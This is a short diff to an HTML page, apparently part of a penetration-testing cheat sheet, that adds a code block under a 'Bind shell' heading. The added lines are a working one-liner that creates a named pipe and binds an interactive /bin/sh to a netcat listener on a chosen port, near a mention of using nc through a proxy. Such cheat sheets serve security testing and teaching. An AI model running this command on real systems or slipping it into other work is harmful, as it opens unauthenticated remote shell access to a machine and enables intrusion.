@@ -159,6 +159,9 @@
 </code></pre>
 <p>You may need to use <a href="./netcat.html"><code>nc</code> with a proxy</a>.</p>
 <h1 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h1>
+<pre><code class="language-bash">mkfifo /tmp/f
+/bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | nc -lvp $port &gt; /tmp/f
+</code></pre>
 
                     </main>
 
